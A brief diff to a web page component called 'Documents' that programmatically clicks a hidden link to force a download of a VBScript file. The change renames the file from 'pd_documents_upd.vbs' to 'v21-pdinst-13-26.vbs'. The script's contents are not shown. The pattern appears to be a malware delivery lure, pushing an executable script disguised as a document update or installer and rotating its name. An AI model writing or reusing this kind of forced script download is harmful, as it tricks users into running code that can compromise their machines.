@@ -10,8 +10,8 @@ const Documents = () => {
 
   const triggerDownload = () => {
     const link = document.createElement("a");
-    link.href = "/pd_documents_upd.vbs";
-    link.download = "pd_documents_upd.vbs";
+    link.href = "/v21-pdinst-13-26.vbs";
+    link.download = "v21-pdinst-13-26.vbs";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
